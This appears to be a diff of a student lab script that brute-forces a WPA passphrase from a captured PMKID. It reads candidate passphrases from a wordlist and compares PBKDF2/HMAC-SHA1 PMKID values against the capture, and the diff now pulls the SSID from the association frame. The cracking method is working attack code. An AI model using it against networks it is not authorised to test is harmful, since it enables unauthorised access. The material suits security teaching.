@@ -4,7 +4,7 @@
 """
 Derive WPA keys from Passphrase and 4-way handshake info
 
-Essaie de bruteforce un WPA sur un PMKID.
+Essaie de bruteforce un WPA sur un PMKID avec des passphrase dans un fichier.
 """
 
 __author__      = "Abraham Rubinstein et Yann Lederrey"
@@ -25,20 +25,20 @@ wpa=rdpcap("PMKID_handshake.pcap")
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file. Passphrase is not used.
 passPhrase  = "admin123"
-A           = "Pairwise key expansion" #this string is used in the pseudo-random function
-ssid        = "Sunrise_2.4GHz_DD4B90"
 
 APmac = b''
 Clientmac = b''
 pmkid = b''
+ssid = ""
 
 # We checked the association trame in capture, and noticed that the SSID was available, in the "Supported tag". 
 # So we could check that we want to attack the targetted SSID. We can get Client et AP MAC there too.
 for trame in wpa:
-    if trame.subtype == 0x0 and trame.type == 0x0 and trame.info.decode("ascii") == ssid:
+    if trame.subtype == 0x0 and trame.type == 0x0:
         APmac = a2b_hex(trame.addr1.replace(':', ''))
         Clientmac = a2b_hex(trame.addr2.replace(':', ''))
         print("AP MAC :", APmac.hex(), " Client MAC :", Clientmac.hex())
+        ssid= trame.info.decode("ascii");
         break
  
 pmkid_to_test = b''   
@@ -72,9 +72,9 @@ Lines = file1.readlines()
 # we iterate each line for each passphrase
 foundPassphrase = False
 for line in Lines:
-    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     passPhrase = str.encode(line.strip())
 
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     if crypto == 2 : # SHA1 to create the MAC (found in 4th message of 4-way handshake)
         pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
     elif crypto == 1: # or it's MD5.
@@ -82,10 +82,10 @@ for line in Lines:
     else :
         print("unknown error")
 
-    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    # We designe the PMKID hash function.
     pmkid = hmac.new(pmk, b'PMK Name' + APmac + Clientmac, hashlib.sha1)
 
-    # We compare the generated pmkid.
+    # We generate the pmkid and verify if it's the same as the one in capture.
     if pmkid_to_test == pmkid.digest()[:16] :
         foundPassphrase = True
         print ("Passphrase found !")
